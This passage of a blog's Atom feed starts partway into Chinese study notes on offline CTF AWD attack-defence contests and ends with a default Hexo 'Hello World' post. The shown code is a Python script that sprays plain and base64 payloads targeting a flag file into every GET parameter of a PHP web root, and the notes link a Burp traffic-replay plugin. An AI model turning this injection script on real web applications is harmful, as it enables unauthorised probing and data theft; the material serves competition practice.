class="string">&quot;/home/web/flag/flag&quot;</span></span><br><span class="line">    <span class="built_in">print</span> get_fake_plain_payloads(flag_path)</span><br><span class="line">    <span class="built_in">print</span> get_fake_base64_payloads(flag_path)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_get</span>(<span class="params">url, root, flag_path</span>):</span><br><span class="line">    all_requests = []</span><br><span class="line">    http_get = get_all(root, <span class="string">&quot;_GET&quot;</span>)</span><br><span class="line">    plain_payloads = get_fake_plain_payloads(flag_path)</span><br><span class="line">    base64_payloads = get_fake_base64_payloads(flag_path)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> http_get:</span><br><span class="line">        path = item[<span class="number">0</span>]</span><br><span class="line">          args = item[<span class="number">1</span>]</span><br><span class="line">                 <span class="keyword">for</span> arg <span class="keyword">in</span> args:</span><br><span class="line">                    <span class="keyword">for</span> payload <span class="keyword">in</span> plain_payloads:</span><br><span class="line">                              new_url = <span class="string">&quot;%s%s?%s=%s&quot;</span> % (url, path[<span class="built_in">len</span>(<span class="string">&quot;./&quot;</span>):], arg[<span class="built_in">len</span>(<span class="string">&quot;$_GET[&#x27;&quot;</span>):-<span class="built_in">len</span>(<span class="string">&quot;&#x27;]&quot;</span>)], payload)</span><br><span class="line">                              request = requests.Request(<span class="string">&quot;GET&quot;</span>, new_url)</span><br><span class="line">                        all_requests.append(request)</span><br><span class="line">                          <span class="keyword">for</span> payload <span class="keyword">in</span> base64_payloads:</span><br><span class="line">                              new_url = <span class="string">&quot;%s%s?%s=%s&quot;</span> % (url, path[<span class="built_in">len</span>(<span class="string">&quot;./&quot;</span>):], arg[<span class="built_in">len</span>(<span class="string">&quot;$_GET[&#x27;&quot;</span>):-<span class="built_in">len</span>(<span class="string">&quot;&#x27;]&quot;</span>)], payload)</span><br><span class="line">                              request = requests.Request(<span class="string">&quot;GET&quot;</span>, new_url)</span><br><span class="line">                              all_requests.append(request)</span><br><span class="line">    <span class="keyword">return</span> all_requests </span><br></pre></td></tr></table></figure><h4 id="流量复用"><a href="#流量复用" class="headerlink" title="流量复用"></a>流量复用</h4><p><a href="http://www.kericwy.xyz/files/scriptgen-burp-plugin-6.jar">http://www.kericwy.xyz/files/scriptgen-burp-plugin-6.jar</a></p><h2 id="参考网站："><a href="#参考网站：" class="headerlink" title="参考网站："></a>参考网站：</h2><p><a href="http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/">http://blog.nsfocus.net/ctf-off-line-attack-defense-guidelines/</a></p><p><a href="https://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/">https://rcoil.me/2017/06/CTF%E7%BA%BF%E4%B8%8B%E8%B5%9B%E6%80%BB%E7%BB%93/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ctf线下AWD攻防赛学习笔记&quot;&gt;&lt;a href=&quot;#ctf线下AWD攻防赛学习笔记&quot; class=&quot;headerlink&quot; title=&quot;ctf线下AWD攻防赛学习笔记&quot;&gt;&lt;/a&gt;ctf线下AWD攻防赛学习笔记&lt;/h1&gt;&lt;p&gt;CTF线下攻防赛主要以攻防模式（At</summary>
      
    
    
    
    <category term="AWD" scheme="https://lhhxs.github.io/categories/AWD/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
    <category term="攻防" scheme="https://lhhxs.github.io/tags/%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://lhhxs.github.io/2022/08/07/hello-world/"/>
    <id>https://lhhxs.github.io/2022/08/07/hello-world/</id>
    <published>2022-08-07T00:32:08.000Z</published>
    <updated>2022-09-09T05:01:57.431Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
    <category term="intro" scheme="https://lhhxs.github.io/tags/intro/"/>
    
  </entry>
  
</feed>
